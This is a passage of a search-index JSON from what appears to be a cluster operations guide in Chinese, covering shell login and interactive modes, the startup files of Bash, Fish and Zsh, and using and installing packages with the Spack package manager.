\u7684\u533a\u522b\u5728\u4e8e\u662f\u5426\u9700\u8981\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\u3002\u8ba9\u6211\u4eec\u4e3e\u4e00\u4e9b\u4f8b\u5b50\uff1a</p> <ul> <li>\u4ece\u63a7\u5236\u53f0\u767b\u5f55\u7cfb\u7edf\uff0c\u9700\u8981\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0c\u8fd9\u662f login shell\u3002</li> <li>\u4f7f\u7528 <code>su</code> \u5207\u6362\u7528\u6237\uff0c\u9700\u8981\u8f93\u5165\u6307\u5b9a\u7528\u6237\u7684\u5bc6\u7801\uff0c\u8fd9\u662f login shell\u3002</li> <li>\u4f7f\u7528 <code>ssh</code> \u767b\u5f55\u8fdc\u7a0b\u7cfb\u7edf\uff0c\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u8fd9\u662f login shell\u3002</li> <li>\u4f7f\u7528 <code>bash</code> \u542f\u52a8\u65b0\u7684 shell\uff0c\u8fd9\u662f non-login shell\u3002</li> <li>\u5728\u56fe\u5f62\u754c\u9762\u4e0b\u6253\u5f00\u7ec8\u7aef\uff08\u5982 konsole\u3001gnome-terminal\uff09\uff0c\u8fd9\u662f non-login shell\u3002\u56e0\u4e3a\u4f60\u5df2\u7ecf\u901a\u8fc7\u5982 GDM\u3001KDM\u3001LightDM \u7b49\u56fe\u5f62\u5316\u767b\u5f55\u754c\u9762\u767b\u5f55\u4e86\u7cfb\u7edf\u3002</li> </ul> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u542f\u52a8 non-login shell\uff0c\u9996\u5148\u8981\u6709\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#interactivenon-interactive-shell","title":"interactive/non-interactive shell","text":"<p>interactive/non-interactive shell \u7684\u533a\u522b\u662f\u8be5 Shell \u662f\u5426\u63a5\u53d7\u7528\u6237\u8f93\u5165\u3002\u8ba9\u6211\u4eec\u4e3e\u4e00\u4e9b\u4f8b\u5b50\uff1a</p> <ul> <li>\u4ece\u63a7\u5236\u53f0\u767b\u5f55\u7cfb\u7edf\uff0c\u8f93\u5165\u547d\u4ee4\uff0c\u8fd9\u662f interactive shell\u3002</li> <li>\u4f7f\u7528 <code>bash -c 'echo hello'</code> \u6267\u884c\u547d\u4ee4\uff0c\u8fd9\u662f non-interactive shell\u3002</li> <li>\u4f7f\u7528 <code>bash</code> \u542f\u52a8\u65b0\u7684 shell\uff0c\u8fd9\u662f interactive shell\u3002</li> <li>\u4f7f\u7528 <code>bash</code> \u542f\u52a8\u65b0\u7684 shell \u6267\u884c\u811a\u672c\uff0c\u8fd9\u662f non-interactive shell\u3002</li> </ul> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u811a\u672c\u4e2d\u4f7f\u7528 <code>read</code> \u7b49\u547d\u4ee4\u5411\u7528\u6237\u8bf7\u6c42\u8f93\u5165\uff0c\u4e5f\u662f non-interactive shell\u3002\u56e0\u4e3a\u8fd9\u5e76\u4e0d\u662f Shell \u672c\u8eab\u7684\u4ea4\u4e92\uff0c\u800c\u662f\u811a\u672c\u4e2d\u547d\u4ee4\u7684\u4ea4\u4e92\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#\u4e24\u8005\u7684\u7ec4\u5408","title":"\u4e24\u8005\u7684\u7ec4\u5408","text":"<p><code>bash</code> \u9009\u9879\u53ef\u4ee5\u63a7\u5236 shell \u7684\u6a21\u5f0f\uff1a</p> <ul> <li><code>-l</code>\uff1alogin shell\uff08\u867d\u7136\u4f7f\u7528 <code>bash -l</code> \u8fd8\u662f\u4e0d\u9700\u8981\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\uff0c\u4f46\u53ef\u4ee5\u770b\u5230\u73af\u5883\u53d8\u91cf\u786e\u5b9e\u6309 login shell \u52a0\u8f7d\u4e86\uff09</li> <li><code>-c</code>\uff1anon-interactive shell</li> </ul> <p>Tip</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u542f\u52a8\u4e00\u4e2a\u5e72\u51c0\u7684 bash\uff1a</p> <pre><code>env -i bash --noprofile --norc\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4e0b\u5217\u547d\u4ee4\u68c0\u67e5\u5f53\u524d\u7684 shell \u6a21\u5f0f\uff1a</p> <ul> <li><code>echo $-</code>\uff1a<ul> <li>\u5305\u542b <code>i</code> \u8868\u793a interactive shell</li> <li>\u4e0d\u5305\u542b <code>i</code> \u8868\u793a non-interactive shell</li> </ul> </li> <li><code>shopt login_shell</code>\uff1a<ul> <li><code>login_shell</code> \u4e3a <code>on</code> \u8868\u793a login shell</li> <li><code>login_shell</code> \u4e3a <code>off</code> \u8868\u793a non-login shell</li> </ul> </li> </ul> <p>\u4f7f\u7528 SSH \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u65f6\uff0cOpenSSH \u5c06\u542f\u52a8\u4e00\u4e2a non-login\u3001non-interactive shell\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#shell-\u542f\u52a8\u65f6\u52a0\u8f7d\u7684\u6587\u4ef6","title":"Shell \u542f\u52a8\u65f6\u52a0\u8f7d\u7684\u6587\u4ef6","text":"Quote <ul> <li>Zsh/Bash startup files loading order (.bashrc, .zshrc etc.) - WordPress</li> </ul> <p><code>/etc/profile</code> \u88ab\u8ba4\u4e3a\u662f\u53ea\u5728\u7528\u6237\u767b\u5f55\uff08login shell\uff09\u65f6\u6267\u884c\u4e00\u6b21\u7684\u6587\u4ef6\u3002\u8fd9\u5bfc\u81f4\u6211\u4eec\u4f7f\u7528 SSH \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6216\u4f7f\u7528 MPI \u901a\u8fc7 SSH \u542f\u52a8\u8fdb\u7a0b\u65f6\uff08\u4e3a non-login non-interactive shell\uff09\uff0c\u653e\u7f6e\u5728 <code>/etc/profile</code> \u4e2d\u7684\u76f8\u5173\u73af\u5883\u53d8\u91cf\u5747\u4e0d\u4f1a\u751f\u6548\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684 Shell\uff0c\u5e94\u5f53\u67e5\u627e\u5176\u5bf9\u5e94\u7684\u542f\u52a8\u6587\u4ef6\uff0c\u4ee5\u786e\u4fdd\u73af\u5883\u53d8\u91cf\u7684\u6b63\u786e\u52a0\u8f7d\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#bash","title":"Bash","text":"Quote <ul> <li>Bash Startup Files - GNU</li> </ul> \u6a21\u5f0f \u6587\u4ef6 login <code>/etc/profile</code><code>~/.bash_profile</code><code>~/.bash_login</code><code>~/.profile</code> interactive non-login <code>~/.bashrc</code> non-interactive non-login \u73af\u5883\u53d8\u91cf <code>BASH_ENV</code> \u6307\u5b9a\u7684\u6587\u4ef6 remote non-interactive <code>~/.bashrc</code> \u5173\u4e8e Bash \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u65f6\u52a0\u8f7d\u6587\u4ef6\u7684\u8fdb\u4e00\u6b65\u63a2\u8ba8 <p>bash/shell.c - GitHub</p> shell.c<pre><code>    /* If we were run by sshd or we think we were run by rshd, execute\n    ~/.bashrc if we are a top-level shell. */\n#if 1   /* TAG:bash-5.3 */\n    if ((run_by_ssh || isnetconn (fileno (stdin))) &amp;&amp; shell_level &lt; 2)\n#else\n    if (isnetconn (fileno (stdin) &amp;&amp; shell_level &lt; 2)\n#endif\n</code></pre> <p>bash/config-top.h - GitHub</p> config-top.h<pre><code>/* Define this if you want bash to try to check whether it's being run by\nsshd and source the .bashrc if so (like the rshd behavior).  This checks\nfor the presence of SSH_CLIENT or SSH2_CLIENT in the initial environment,\nwhich can be fooled under certain not-uncommon circumstances. */\n/* #define SSH_SOURCE_BASHRC */\n</code></pre> <p><code>SSH_SOURCE_BASHRC</code> \u9ed8\u8ba4\u4e3a undefined\u3002\u90a3\u552f\u4e00\u7684\u6761\u4ef6\u5c31\u662f\uff0c\u5982\u679cstdin \u4e3a\u7f51\u7edc\u8fde\u63a5\uff0c\u5219\u4f1a\u52a0\u8f7d bashrc\u3002</p> <p>\u5224\u65ad\u7f51\u7edc\u8fde\u63a5\u7684\u65b9\u5f0f\u4e3a\uff0c\u6d4b\u8bd5\u4e0b getpeername \u4f1a\u4e0d\u4f1a\u62a5\u9519\uff1abash/netconn.c - GitHub</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#fish","title":"Fish","text":"Quote <ul> <li>Configuration files - Fish Shell</li> </ul> <p>Fish \u4e0d\u4f1a\u8bfb\u53d6 <code>/etc/profile</code></p> <ul> <li>Configuration snippets:<ul> <li><code>~/.config/fish/conf.d/</code></li> <li><code>/etc/fish/conf.d/</code></li> <li><code>~/.local/share/fish</code></li> <li><code>/usr/share/fish/vendor_conf.d</code></li> <li><code>/usr/local/share/fish/vendor_conf.d</code></li> </ul> </li> <li>System-wide configuration files: <code>/etc/fish/config.fish</code></li> <li>User configuration: <code>~/.config/fish/config.fish</code></li> </ul> <p>Fish \u6587\u6863\u8bf4\u660e\uff0c\u4e0d\u8bba\u4ee5\u4f55\u79cd\u65b9\u5f0f\u542f\u52a8\uff0c\u90fd\u4f1a\u6309\u7167\u4e0a\u8ff0\u987a\u5e8f\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u3002\u4f46\u5b9e\u9645\u64cd\u4f5c\u65f6\uff0c\u53d1\u73b0 non-interactive \u65f6\u4f3c\u4e4e\u4e0d\u4f1a\u52a0\u8f7d snippets\u3002\u603b\u4e4b\uff0c\u5bf9\u4e8e Fish\uff0c\u8981\u4fdd\u8bc1\u6240\u6709\u60c5\u51b5\u4e0b\u52a0\u8f7d\uff0c\u5e94\u5f53\u5c06\u914d\u7f6e\u76f4\u63a5\u5199\u5165 <code>/etc/fish/config.fish</code>\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#zsh","title":"Zsh","text":"Quote <ul> <li>Startup Files - SourceForge</li> <li>ZSH startup file headaches - GitHub</li> </ul> <ul> <li><code>/etc/zsh/zshenv</code></li> <li><code>~/.zshenv</code></li> <li><code>/etc/zsh/zprofile</code> (if login shell)</li> <li><code>~/.zprofile</code>   (if login shell)</li> <li><code>/etc/zsh/zshrc</code>    (if interactive)</li> <li><code>~/.zshrc</code>      (if interactive)</li> <li><code>/etc/zsh/zlogin</code>   (if login shell)</li> <li><code>~/.zlogin</code>     (if login shell)</li> </ul> <p>\u5bf9\u4e8e Zsh\uff0c\u8981\u4fdd\u8bc1\u6240\u6709\u60c5\u51b5\u4e0b\u52a0\u8f7d\uff0c\u5e94\u5f53\u5c06\u914d\u7f6e\u76f4\u63a5\u5199\u5165 <code>/etc/zsh/zshrc</code>\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/shell/#\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u7684\u65b9\u5f0f","title":"\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u7684\u65b9\u5f0f","text":"<p>\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6709\u975e\u5e38\u591a\u79cd\u65b9\u5f0f\uff0c\u4e0d\u4e00\u5b9a\u6d89\u53ca Shell\u3002</p> <ul> <li> <p>SSH \u603b\u662f\u901a\u8fc7\u7528\u6237\u7684 Login Shell \u6267\u884c\u547d\u4ee4\uff0c\u4f46\u8be5 Shell \u7684\u72b6\u6001\u4e0d\u4e00\u5b9a\u80fd\u591f\u662f login \u7684\u3002\u6bd4\u5982\uff0c\u6267\u884c\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u547d\u4ee4\uff0c\u4f1a\u7531 Login Shell \u62a5\u544a\u9519\u8bef\u4fe1\u606f\uff1a</p> <pre><code>$ ssh machine non-exist\nfish: Unknown command: non-exist\n</code></pre> </li> <li> <p>Slurm \u8fdc\u7a0b\u6267\u884c\u5219\u4e0d\u6d89\u53ca Shell\u3002\u542f\u52a8\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u662f\u7531 <code>execve()</code> \u62a5\u544a\u9519\u8bef\u4fe1\u606f\uff1a</p> <pre><code>$ srun non-exist\nslurmstepd: error: execve(): non-exist: No such file or directory\n</code></pre> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/","title":"\u5305\u7ba1\u7406\u5668\uff1aSpack","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5305\u7ba1\u7406\u5668spack","title":"\u5305\u7ba1\u7406\u5668\uff1aSpack","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#spack-\u5feb\u901f\u4e0a\u624b","title":"Spack \u5feb\u901f\u4e0a\u624b","text":"<p>Quote</p> <ul> <li>Basic Usage \u2014 Spack documentation</li> </ul> <p>Spack \u662f HPC \u4e2d\u6700\u6d41\u884c\u7684\u5305\u7ba1\u7406\u5668\u3002\u5b83\u5e2e\u52a9\u4f60\u81ea\u52a8\u5b8c\u6210\u62c9\u53d6\u6e90\u7801\u3001 <code>configure</code>\u00a0\u548c <code>make install</code>\u00a0\u7b49\u6784\u5efa\u6d41\u7a0b\uff0c\u5e76\u8d1f\u8d23\u7ef4\u62a4\u73af\u5883\u53d8\u91cf\u5982 <code>PATH</code>\u00a0\u3001 <code>LD_LIBRARY_PATH</code>\u00a0\u7b49\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u52a0\u8f7d\u96c6\u7fa4\u4e0a\u7684-spack","title":"\u52a0\u8f7d\u96c6\u7fa4\u4e0a\u7684 Spack","text":"<p>\u533a\u5206\u96c6\u7fa4\u7ea7\u522b\uff08site level\uff09\u548c\u7528\u6237\u7ea7\u522b\uff08user level\uff09\u7684 Spack \u5b9e\u4f8b</p> <p>\u96c6\u7fa4\u4e0a\u76ee\u524d\u5728 <code>/pxe/opt/spack</code> \u76ee\u5f55\u4e0b\u5b89\u88c5\u4e86 Spack\uff08\u4e0b\u79f0\u96c6\u7fa4 Spack\uff09\uff0c\u63d0\u4f9b\u4e86\u5e38\u7528\u7684\u7f16\u8bd1\u5de5\u5177\u5982 <code>nvhpc</code>, <code>oneapi</code>, <code>aocc</code> \u7b49\u3002\u96c6\u7fa4 Spack \u5df2\u7ecf\u5199\u5165\u4e86\u5404\u4e2a Shell \u7cfb\u7edf\u7ea7\u522b\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u5982 <code>/etc/profile.d</code>\uff09\uff0c\u4f1a\u5728\u767b\u9646 Shell \u4e2d\u81ea\u52a8\u52a0\u8f7d\u3002</p> <p>\u4f46\u662f\u96c6\u7fa4 Spack \u7684\u76ee\u5f55\u4ec5\u6709\u7ba1\u7406\u5458\u53ef\u4fee\u6539\uff0c\u666e\u901a\u7528\u6237\u53ea\u80fd\u4f7f\u7528\u800c\u65e0\u6cd5\u5b89\u88c5\u8f6f\u4ef6\u5305\u3002\u5982\u679c\u4f60\u5e0c\u671b\u5b89\u88c5\u96c6\u7fa4\u4e0a\u6ca1\u6709\u63d0\u4f9b\u7684\u8f6f\u4ef6\u5305\uff0c\u8bf7\u5728\u5bb6\u76ee\u5f55\u4e0b\u81ea\u884c\u5b89\u88c5 Spack \u5b9e\u4f8b\uff08\u4e0b\u79f0\u7528\u6237 Spack\uff09\uff0c\u5e76\u5c06\u4e0a\u6e38\u6307\u5411\u96c6\u7fa4 Spack\uff0c\u89c1 \u4e32\u8054 Spack \u5b9e\u4f8b\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u67e5\u770b\u8f6f\u4ef6\u5305","title":"\u67e5\u770b\u8f6f\u4ef6\u5305","text":"<p>\u4f7f\u7528 <code>spack find</code>\u00a0\u53ef\u4ee5\u67e5\u770b\u5df2\u5b89\u88c5\u7684\u5305\uff1a</p> <pre><code>$ spack find\n-- linux-debian12-icelake / gcc@12.2.0 --------------------------\ngcc-runtime@12.2.0  glibc@2.36  gmake@4.3  libiconv@1.17  libxml2@2.10.3\npkgconf@1.8.1  xz@5.4.6  zlib-ng@2.1.6\n==&gt; 8 installed packages\n</code></pre> <p>\u6982\u5ff5\uff1aspec</p> <p>A spec is like a name, but it has a version, compiler, architecture, and build options associated with it. In spack, you can have many installations of the same package with different specs.</p> <p>spec \u662f Spack \u4e2d\u6309\u7279\u5b9a\u9009\u9879\u6784\u5efa\u7684\u4e00\u4e2a\u8f6f\u4ef6\u5305\uff0c\u5305\u542b\u8f6f\u4ef6\u5305\u540d\u3001\u7248\u672c\u3001\u7f16\u8bd1\u5668\u3001\u9009\u9879\u7b49\u4fe1\u606f\u3002\u6bd4\u5982 <code>gcc@12.2.0</code>\u00a0\u5c31\u662f\u4e00\u4e2a spec\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8f6f\u4ef6\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u7f16\u8bd1\u9009\u9879\u9009\u9879\u6784\u5efa\u591a\u4e2a Spec\u3002</p> <p>\u4f7f\u7528 <code>spack find -dvf</code> \u53ef\u4ee5\u67e5\u770b spec \u7684\u8be6\u7ec6\u4fe1\u606f\uff1a</p> <pre><code>$ spack find -dfv\n-- linux-debian12-icelake / gcc@12.2.0 --------------------------\ncuda@11.8.0%gcc ~allow-unsupported-compilers+dev build_system=generic\n    gcc-runtime@12.2.0%gcc  build_system=generic\n    glibc@2.36%gcc  build_system=autotools\n    libxml2@2.10.3%gcc +pic~python+shared build_system=autotools\n        gmake@4.3%gcc ~guile build_system=generic patches=599f134\n        libiconv@1.17%gcc  build_system=autotools libs=shared,static\n        pkgconf@1.8.1%gcc  build_system=autotools\n        xz@5.4.6%gcc ~pic build_system=autotools libs=shared,static\n        zlib-ng@2.1.6%gcc +compat+new_strategies+opt+pic+shared build_system=autotools\n</code></pre> <p>Spec \u7684\u5e38\u7528\u7b26\u53f7\u542b\u4e49\u5982\u4e0b\uff1a</p> Symbol Example Description <code>@</code> <code>@1.2:1.4</code> \u6307\u5b9a\u7248\u672c <code>%</code> <code>%gcc@4.7</code> \u76f4\u63a5\u4f9d\u8d56\uff08\u901a\u5e38\u4e3a\u7f16\u8bd1\u5668\uff09 <code>^</code> <code>^gcc@4.7</code> \u95f4\u63a5\u4f9d\u8d56 <code>+</code>\u3001<code>-</code> \u6216 <code>~</code> <code>+mpi</code> \u5e03\u5c14\u7c7b\u578b\u9009\u9879 <code>~</code> \u4e0e <code>-</code> \u7b49\u4ef7\uff0c\u7528\u4e8e\u67d0\u4e9b\u60c5\u51b5\u4e0b\u963b\u6b62 shell \u89e3\u6790 <code>++</code>\u3001<code>--</code> \u6216 <code>~~</code> <code>++mpi</code> \u5e03\u5c14\u7c7b\u578b\u9009\u9879\uff0c\u5728\u4f9d\u8d56\u4e4b\u95f4\u4f20\u9012 <code>name=&lt;value&gt;</code> <code>build_system=cmake</code> \u6307\u5b9a\u9009\u9879\u7684\u503c <code>name==&lt;value&gt;</code> <code>build_system==cmake</code> \u6307\u5b9a\u9009\u9879\u7684\u503c\uff0c\u5728\u4f9d\u8d56\u4e4b\u95f4\u4f20\u9012 <code>&lt;flag&gt;=&lt;flags&gt;</code> <code>cflags=-O3</code> \u7279\u6b8a\u7684\u7f16\u8bd1\u5668\u9009\u9879\uff0c\u5982\uff1a<code>cflags</code>, <code>cxxflags</code>, <code>fflags</code>, <code>cppflags</code>, <code>ldflags</code>, and <code>ldlibs</code> <p>\u6709\u51e0\u4e2a\u7279\u6b8a\u7684\u6709\u540d\u9009\u9879\uff1a<code>platform</code> \u5185\u6838\u540d\uff08<code>darwin</code> \u7b49\uff09\u3001<code>os</code> \u53d1\u884c\u7248\u540d\u3001<code>target</code> \u5fae\u67b6\u6784\u540d\u3002</p> <p>\u5bf9\u4e8e\u672c\u5730\u5b89\u88c5\u7684 spec\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7 <code>/</code> \u54c8\u5e0c\u503c\u6765\u6307\u5b9a\uff1a</p> <pre><code>$ spack location --install-dir cuda\n==&gt; Error: cuda matches multiple packages.\nMatching packages:\n    ngtuhol cuda@11.8.0%gcc@12.2.0 arch=linux-debian12-icelake\n    bthqeln cuda@12.4.0%gcc@12.2.0 arch=linux-debian12-icelake\nUse a more specific spec (e.g., prepend '/' to the hash).\n$ spack location --install-dir cuda/ngtuhol\n/opt/spack/opt/spack/linux-debian12-icelake/gcc-12.2.0/cuda-11.8.0-ngtuholoe4xatxmphodttdett3rmhjrr\n</code></pre> <p>\u4e00\u4e9b\u590d\u6742\u7684 Spec \u53ef\u4ee5\u4f7f\u7528\u5f15\u53f7\u62ec\u8d77\u4f5c\u4e3a\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u5426\u5219 Spack \u4f1a\u8bc6\u522b\u9519\u8bef\u3002\u4f8b\u5982 <code>spack diff &lt;spec&gt; &lt;spec&gt;</code>\uff1a</p> <pre><code>$ spack diff intel-oneapi-compilers arch=linux-debian12-icelake intel-oneapi-compilers arch=linux-debian12-zen3\n==&gt; Error: You must provide two specs to diff.\n$ spack diff 'intel-oneapi-compilers arch=linux-debian12-icelake' 'intel-oneapi-compilers arch=linux-debian12-zen3'\n\n--- intel-oneapi-compilers@2025.0.4/jwh4nndynkcqhogdltdrxjkiilvulwyg\n+++ intel-oneapi-compilers@2025.0.4/zc7x2awdl3jriiydjaozmaizjhcsp2u5\n@@ hash @@\n- intel-oneapi-compilers jwh4nndynkcqhogdltdrxjkiilvulwyg\n+ intel-oneapi-compilers zc7x2awdl3jriiydjaozmaizjhcsp2u5\n@@ node_target @@\n- intel-oneapi-compilers icelake\n+ intel-oneapi-compilers zen3\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u4f7f\u7528\u8f6f\u4ef6\u5305","title":"\u4f7f\u7528\u8f6f\u4ef6\u5305","text":"<p>Spack \u4e2d\u7684\u8f6f\u4ef6\u5305\u6709\u4e09\u79cd\u4f7f\u7528\u65b9\u5f0f\uff1a</p> <ul> <li> <p><code>spack load</code>\uff1a\u4f7f\u7528\u5355\u4e2a\u8f6f\u4ef6\u5305\u3002\u6bd4\u5982</p> <pre><code>spack load gcc@11.2.0\n</code></pre> </li> <li> <p>Module\uff1aSpack \u63d0\u4f9b\u5bf9 Environment Modules \u548c Lmod \u7684\u652f\u6301\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u5728\u6784\u5efa Spec \u540e\u81ea\u52a8\u751f\u6210 modulefile\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>module</code> \u547d\u4ee4\u52a0\u8f7d Spack \u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\u3002</p> <pre><code>spack module lmod refresh\nmodule load gcc@11.2.0\n</code></pre> </li> <li> <p>Environment\uff1a\u4e0e Conda \u73af\u5883\u7c7b\u4f3c\uff0c\u5c31\u662f\u4e00\u7ec4\u53ef\u4ee5\u6784\u5efa\u7684 Spec\u3002\u4e0e modules \u76f8\u6bd4\uff0c\u5b83\u66f4\u52a0\u7a33\u5b9a\u3001\u53ef\u590d\u73b0\uff0c\u4e14\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53 load\u3002</p> <pre><code>spack env activate -p myenv\n</code></pre> </li> </ul> <p>\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u4efb\u610f\u4e00\u6761\u547d\u4ee4\u67e5\u770b\u5f53\u524d\u52a0\u8f7d\u7684\u8f6f\u4ef6\u5305\uff1a</p> <pre><code>spack find --loaded\nspack list --loaded\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5b89\u88c5\u81ea\u5df1\u7684-spack-\u5b9e\u4f8b","title":"\u5b89\u88c5\u81ea\u5df1\u7684 spack \u5b9e\u4f8b","text":"<p>Quote</p> <ul> <li>\u5b98\u65b9\u5b89\u88c5\u6587\u6863\uff1aGetting Started - Spack</li> </ul> <p>\u4f7f\u7528 Spack\uff0c\u53ea\u9700\u8981\u4ece GitHub \u4ed3\u5e93 pull \u6216\u8005\u4e0b\u8f7d Release \u4e2d\u7684\u7a33\u5b9a\u7248\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u3002GitHub Release \u4e2d\u6253\u5305\u7684\u8f6f\u4ef6\u5305\u5f80\u5f80\u4e0d\u662f\u6700\u65b0\u7684\uff0c\u63a8\u8350\u6309\u5b98\u65b9\u6587\u6863\u4f7f\u7528 <code>git clone</code> \u76f4\u63a5\u62c9\u53d6\u4ed3\u5e93\u3002\u5728\u5bb6\u76ee\u5f55\u4e0b\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef\u5b89\u88c5 Spack\u3002</p> <pre><code>git clone -c feature.manyFiles=true --depth=2 https://github.com/spack/spack.git\n</code></pre> <p>\u4e0b\u8f7d\u540e Spack \u5e76\u6ca1\u6709\u88ab\u52a0\u5165\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u4f60\u9700\u8981\u8fdb\u4e00\u6b65\u589e\u52a0 shell \u652f\u6301\u3002\u5411\u4f60\u7684 shell \u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code># For bash/zsh/sh\n# bash: ~/.bashrc\n# zsh: ~/.zshrc\nsource spack/share/spack/setup-env.sh\n\n# For tcsh/csh\n# tcsh: ~/.tcshrc\n# csh: ~/.cshrc\nsource spack/share/spack/setup-env.csh\n\n# For fish\n# fish: ~/.config/fish/config.fish\nsource spack/share/spack/setup-env.fish\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u4e32\u8054-spack-\u5b9e\u4f8b","title":"\u4e32\u8054 Spack \u5b9e\u4f8b","text":"<p>\u4fee\u6539\u4e0d\u540c\u7ea7\u522b\u7684\u914d\u7f6e</p> <ul> <li>\u90e8\u5206 Spack \u547d\u4ee4\u53ef\u4ee5\u4f7f\u7528 <code>--scope=</code> \u9009\u9879\u6307\u5b9a\u914d\u7f6e\u7ea7\u522b\uff0c\u5982 <code>--scope=site</code>\u3001<code>--scope=user</code>\u3002\u9ed8\u8ba4\u4e3a\u7528\u6237\u7ea7\u522b\u3002</li> <li>\u7528\u6237 spack \u7684\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e <code>~/.spack</code> \u76ee\u5f55\u4e0b</li> </ul> <p>\u7528\u6237 spack \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u5c06\u96c6\u7fa4 spack \u6307\u5b9a\u4e3a\u4e0a\u6e38 Spack \u5b9e\u4f8b\uff0c\u4ece\u800c\u590d\u7528\u96c6\u7fa4 spack \u5df2\u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\uff0c\u8282\u7701\u5b89\u88c5\u65f6\u95f4\u3002</p> \u4f7f\u7528\u547d\u4ee4\u6dfb\u52a0\u914d\u7f6e\u624b\u52a8\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 <pre><code>spack config add upstreams:zjusct-spack:install_tree:/pxe/opt/spack/opt/spack\n</code></pre> <p>\u8be5\u914d\u7f6e\u6587\u4ef6\u9ed8\u8ba4\u6ca1\u6709\u521b\u5efa\uff0c\u8bf7\u5728\u521b\u5efa\u540e\u5199\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> ~/.spack/upstreams.yaml<pre><code>upstreams:\n  zjusct-spack:\n    install_tree: /pxe/opt/spack/opt/spack\n</code></pre> <p>\u8fd9\u6837\uff0c\u8fd0\u884c <code>spack find</code> \u547d\u4ee4\u5c31\u53ef\u4ee5\u770b\u5230\u96c6\u7fa4\u4e0a\u7684 Spack \u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u66f4\u6539 Spack \u7684\u8f6f\u4ef6\u5305\u914d\u7f6e\uff0c\u8fd9\u4e9b\u66f4\u6539\u5c06\u4f1a\u653e\u5728\u4f60\u624b\u5de5\u5b89\u88c5\u7684 Spack \u76ee\u5f55\u4e0b\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/software/spack/#\u5b89\u88c5\u8f6f\u4ef6\u5305","title":"\u5b89\u88c5\u8f6f\u4ef6\u5305","text":"<p>\u4f7f\u7528 <code>spack install &lt;spec&gt;</code>\u00a0\u5b89\u88c5\u8f6f\u4ef6\u5305\u3002\u56e0\u4e3a spec \u8bed\u6cd5\u6613\u9519\uff0c\u6240\u4ee5\u5728\u5b89\u88c5\u524d\u5efa\u8bae\u4f7f\u7528 <code>spack spec -I &lt;spec&gt;</code>\u00a0\u786e\u8ba4\u8f6f\u4ef6\u4f9d\u8d56\u548c\u9009\u9879\u662f\u5426\u6b63\u786e\u3002\u4f8b\u5982\uff1a</p> <pre><code>$ spack spec -I openblas\n -   openblas@0.3.29%gcc@12.2.0~bignuma~consistent_fpcsr+dynamic_dispatch+fortran~ilp64+locking+pic+shared build_system=makefile symbol_suffix=none threads=none arch=linux-debian12-icelake\n[+]      ^gcc-runtime@12.2.0%gcc@12.2.0 build_system=generic arch=linux-debian12-icelake\n[e]      ^glibc@2.36%gcc@12.2.0 build_system=autotools arch=linux-debian12-icelake\n[e]      ^gmake@4.3%gcc@12.2.0~guile build_system=generic patches=599f134 arch=linux-debian12-icelake\n$ spack install openblas\n</code></pre> <p>Spec \u524d\u7684 <code>e</code>\uff08external\uff09\u8868\u793a\u975e Spack 